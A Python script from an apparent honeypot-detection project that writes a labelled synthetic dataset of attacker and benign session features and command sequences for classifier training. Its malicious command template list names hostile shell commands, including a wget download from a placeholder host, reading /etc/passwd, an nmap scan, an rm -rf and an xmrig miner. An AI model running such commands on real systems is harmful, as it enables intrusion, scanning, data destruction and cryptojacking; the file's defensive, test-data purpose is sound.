#!/usr/bin/env python3
"""Generate a deterministic, explicitly synthetic feature dataset.

This script does not use captured or real-world data.  Rows are synthesised
from documented benign/malicious behavioural templates and are intended only
to exercise the training and evaluation code path.  Metrics produced from
this dataset are not evidence of real-world detection performance.
"""

from __future__ import annotations

import argparse
import csv
import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

from _bootstrap import ROOT
from deephoney.features.extractor import FEATURE_NAMES, FEATURE_VERSION

DEFAULT_ROWS = 240
DEFAULT_SEED = 42
SYNTHETIC_NOTICE = (
    "Synthetic dataset generated for pipeline validation only. "
    "It is not captured traffic and must not be cited as real-world accuracy."
)

_BENIGN_COMMANDS = [
    "uname -a",
    "id",
    "pwd",
    "ls -la",
    "whoami",
    "df -h",
    "cat /etc/os-release",
]
_MALICIOUS_COMMANDS = [
    "uname -a",
    "id",
    "whoami",
    "cat /etc/passwd",
    "wget http://198.51.100.20/deephoney-demo.sh",
    "crontab -l",
    "nmap -sT 192.0.2.0/24",
    "rm -rf /tmp/deephoney-demo-only",
    "xmrig --donate-level 1",
    "systemctl status",
]


def _clamp(value: float, low: float, high: float) -> float:
    return max(low, min(high, value))


def _row(
    rng: random.Random,
    index: int,
    *,
    label: int,
    created_at: datetime,
) -> dict[str, Any]:
    if label == 1:
        event_count = rng.randint(12, 120)
        auth_failures = rng.randint(3, 45)
        auth_successes = rng.randint(0, 2)
        command_count = rng.randint(2, 25)
        distinct_commands = max(1, int(command_count * rng.uniform(0.5, 1.0)))
        recon = rng.randint(1, 7)
        file_transfer = rng.randint(0, 3)
        persistence = rng.randint(0, 2)
        destructive = rng.randint(0, 1)
        crypto = rng.randint(0, 1)
        lateral = rng.randint(0, 3)
        privilege = rng.randint(0, 2)
        shell_utility = rng.randint(0, 3)
        downloads = rng.randint(0, 3)
        artifacts = rng.randint(0, 2)
        executable = rng.randint(0, 1)
        artifact_size = float(rng.choice([0, 512, 1024, 4096, 16384]))
        dst_ports = rng.randint(1, 5)
        src_ports = rng.randint(1, 3)
        protocols = rng.randint(1, 3)
        connections = rng.randint(1, 6)
        success = rng.randint(0, 1)
        src_ip = f"203.0.113.{rng.randint(10, 40)}"
    else:
        event_count = rng.randint(1, 12)
        auth_failures = rng.randint(0, 2)
        auth_successes = rng.randint(0, 1)
        command_count = rng.randint(0, 3)
        distinct_commands = command_count
        recon = rng.randint(0, 1) if command_count else 0
        file_transfer = 0
        persistence = 0
        destructive = 0
        crypto = 0
        lateral = 0
        privilege = 0
        shell_utility = 0
        downloads = 0
        artifacts = 0
        executable = 0
        artifact_size = 0.0
        dst_ports = rng.randint(1, 2)
        src_ports = rng.randint(1, 2)
        protocols = rng.randint(1, 2)
        connections = rng.randint(0, 2)
        success = auth_successes
        src_ip = f"198.51.100.{rng.randint(10, 40)}"

    duration = float(rng.randint(2, 900))
    auth_attempts = auth_failures + auth_successes
    event_time = created_at + timedelta(minutes=index * 17)
    return {
        "source_engine": "cowrie" if index % 2 == 0 else "dionaea",
        "session_id": f"synthetic-{index:05d}",
        "src_ip": src_ip,
        "timestamp": event_time.isoformat(),
        "feature_version": FEATURE_VERSION,
        "label": label,
        "engine_is_cowrie": 1 if index % 2 == 0 else 0,
        "engine_is_dionaea": 0 if index % 2 == 0 else 1,
        "event_count": event_count,
        "duration_seconds": round(duration, 3),
        "events_per_minute": round(min(10000.0, event_count / max(duration, 1.0) * 60.0), 3),
        "auth_attempts": auth_attempts,
        "auth_failures": auth_failures,
        "auth_successes": auth_successes,
        "auth_failure_ratio": round(auth_failures / auth_attempts, 4) if auth_attempts else 0.0,
        "distinct_usernames": min(12, rng.randint(1, 5) + (4 if label else 0)),
        "distinct_password_hashes": auth_attempts,
        "command_count": command_count,
        "distinct_commands": distinct_commands,
        "unique_command_ratio": (
            round(distinct_commands / command_count, 4) if command_count else 0.0
        ),
        "recon_command_count": recon,
        "file_transfer_command_count": file_transfer,
        "persistence_command_count": persistence,
        "destructive_command_count": destructive,
        "crypto_command_count": crypto,
        "lateral_command_count": lateral,
        "privilege_command_count": privilege,
        "shell_utility_count": shell_utility,
        "high_risk_command_count": persistence + destructive + crypto + lateral + privilege,
        "download_count": downloads,
        "artifact_count": artifacts,
        "has_artifact": 1 if artifacts else 0,
        "total_artifact_size": artifact_size,
        "has_executable_artifact": executable,
        "distinct_src_ports": src_ports,
        "distinct_dst_ports": dst_ports,
        "distinct_protocols": protocols,
        "connection_count": connections,
        "has_successful_login": 1 if success else 0,
        "src_ip_session_count": rng.randint(1, 6) if label else 1,
    }


def generate_synthetic_dataset(
    output_path: str | Path = "data/samples/synthetic/synthetic_sessions.csv",
    *,
    rows: int = DEFAULT_ROWS,
    seed: int = DEFAULT_SEED,
) -> dict[str, Any]:
    if rows < 20:
        raise ValueError("At least 20 rows are required")
    rng = random.Random(seed)
    created_at = datetime(2024, 3, 1, 9, 0, tzinfo=UTC)
    records = [
        _row(rng, index, label=1 if index % 2 else 0, created_at=created_at)
        for index in range(rows)
    ]
    rng.shuffle(records)
    target = Path(output_path).expanduser().resolve()
    target.parent.mkdir(parents=True, exist_ok=True)
    columns = [
        "source_engine",
        "session_id",
        "src_ip",
        "timestamp",
        "feature_version",
        "label",
        *FEATURE_NAMES,
    ]
    with target.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=columns)
        writer.writeheader()
        writer.writerows(records)
    malicious = sum(1 for row in records if row["label"] == 1)
    summary = {
        "path": str(target),
        "rows": len(records),
        "benign": len(records) - malicious,
        "malicious": malicious,
        "seed": seed,
        "feature_version": FEATURE_VERSION,
        "synthetic": True,
        "notice": SYNTHETIC_NOTICE,
    }
    target.with_suffix(".metadata.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8"
    )
    return summary


def generate_command_sequences(
    output_path: str | Path = "data/samples/synthetic/command_sequences.jsonl",
    *,
    rows: int = 80,
    seed: int = DEFAULT_SEED,
) -> dict[str, Any]:
    rng = random.Random(seed + 1)
    target = Path(output_path).expanduser().resolve()
    target.parent.mkdir(parents=True, exist_ok=True)
    entries: list[dict[str, Any]] = []
    for index in range(rows):
        label = 1 if index % 2 else 0
        templates = _MALICIOUS_COMMANDS if label else _BENIGN_COMMANDS
        count = rng.randint(2, 8) if label else rng.randint(1, 3)
        commands = [rng.choice(templates) for _ in range(count)]
        if label:
            commands = list(dict.fromkeys(commands))
        entries.append(
            {
                "session_id": f"synthetic-seq-{index:05d}",
                "src_ip": (
                    f"203.0.113.{rng.randint(50, 80)}"
                    if label
                    else f"198.51.100.{rng.randint(50, 80)}"
                ),
                "commands": commands,
                "label": label,
                "synthetic": True,
            }
        )
    target.write_text(
        "\n".join(json.dumps(entry, sort_keys=True) for entry in entries) + "\n",
        encoding="utf-8",
    )
    summary = {
        "path": str(target),
        "rows": len(entries),
        "seed": seed + 1,
        "synthetic": True,
        "notice": SYNTHETIC_NOTICE,
    }
    target.with_suffix(".metadata.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8"
    )
    return summary


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--out",
        default=str(ROOT / "data/samples/synthetic/synthetic_sessions.csv"),
        help="Output CSV path",
    )
    parser.add_argument(
        "--sequences-out",
        default=str(ROOT / "data/samples/synthetic/command_sequences.jsonl"),
        help="Output JSONL command-sequence path",
    )
    parser.add_argument("--rows", type=int, default=DEFAULT_ROWS)
    parser.add_argument("--seed", type=int, default=DEFAULT_SEED)
    return parser


def main() -> int:
    args = build_parser().parse_args()
    dataset = generate_synthetic_dataset(args.out, rows=args.rows, seed=args.seed)
    sequences = generate_command_sequences(
        args.sequences_out, rows=max(20, args.rows // 3), seed=args.seed
    )
    print(json.dumps({"sessions": dataset, "sequences": sequences}, indent=2))
    print(f"\n{SYNTHETIC_NOTICE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
